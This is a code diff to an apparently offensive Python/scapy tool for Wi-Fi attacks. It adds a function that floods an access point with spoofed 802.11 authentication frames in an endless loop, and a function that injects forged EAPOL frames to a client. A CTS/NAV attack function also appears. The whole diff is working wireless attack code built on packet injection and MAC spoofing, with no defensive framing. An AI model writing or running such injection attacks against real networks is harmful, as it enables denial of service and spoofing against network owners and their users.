@@ -1,17 +1,23 @@
-import subprocess
+from time import sleep
 
-from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap, Dot11AssoReq
+from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap, Dot11AssoReq, EAPOL
+from termcolor import cprint
 
 
 def auth_attack(interface, sta, ap):
-    pkt = Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
+    pkt = RadioTap() / Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
           Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
     while True:
+        cprint("ZZZ", 'blue')
         interface.inject(pkt)
+        pkt.SC += 3
+        sleep(1)
 
 
-def forged_1(interface, sta, ap):
-    pass
+def forged_1(interface, ap, sta):
+    pkt = RadioTap() / Dot11(addr1=sta.mac_addr, addr2=ap.bssid, addr3=ap.bssid) / \
+          EAPOL(type=3)
+    interface.inject(pkt)
 
 
 def cts_nav_attack(interface, target_mac):
